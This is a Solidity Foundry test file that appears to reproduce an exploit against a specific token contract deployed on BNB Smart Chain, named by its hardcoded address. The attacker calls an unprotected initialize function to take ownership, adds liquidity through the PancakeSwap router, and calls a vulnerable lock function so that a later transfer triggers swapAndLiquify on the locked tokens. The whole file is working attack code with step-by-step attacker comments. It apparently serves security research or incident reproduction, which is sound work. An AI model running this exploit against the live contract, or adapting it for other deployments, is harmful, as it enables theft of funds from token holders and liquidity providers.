// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface Plenty {
    function initialize(address _router, address _buyback) external;
    function owner() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function setBuyBack(address buyBack) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function lock(bytes32 _reason, uint256 _amount, uint256 _time) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    Plenty public targetContract;
    IUniswapV2Router02 public router;
    uint256 private numTokensSellToAddToLiquidity = 500_000 * 10**6 * 1e18;
    address constant TARGET = 0xa5e8A886B6BAB60E1A2273b79CaA72143eD8B418;
    address attacker = address(this);
    // address private owner = 0x4ff30C9069f52A8F3237042578508F7517f7c7A6; // Unused variable removed

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        targetContract = Plenty(payable(TARGET));
        // Use the correct PancakeSwap V2 Router address for BSC mainnet.
        address pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        // 1. Attacker initializes the contract, becoming the owner and setting the buyback address.
        targetContract.initialize(pancakeRouterAddress, address(this));

        router = IUniswapV2Router02(targetContract.uniswapV2Router());

        // 2. Attacker gets ETH for gas and to provide substantial liquidity.
        deal(address(this), 100 ether);

        // 3. Attacker provides initial liquidity to the pool.
        // The attacker owns the total token supply from initialization.
        uint256 tokenAmountForLiq = 1_000_000 * 10**6 * 1e18;
        uint256 ethAmountForLiq = 50 ether;
        targetContract.approve(address(router), tokenAmountForLiq);
        router.addLiquidityETH{value: ethAmountForLiq}(
            address(targetContract),
            tokenAmountForLiq,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 amountToLock = numTokensSellToAddToLiquidity;

        // 1. As owner/WhitelistAdmin, attacker calls the vulnerable lock function.
        // This transfers 'amountToLock' tokens from the attacker to the contract.
        targetContract.lock(bytes32("pwned"), amountToLock, 1 days);

        // 2. Any subsequent transfer triggers swapAndLiquify with the 'locked' funds.
        targetContract.transfer(makeAddr("dummy"), 1);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}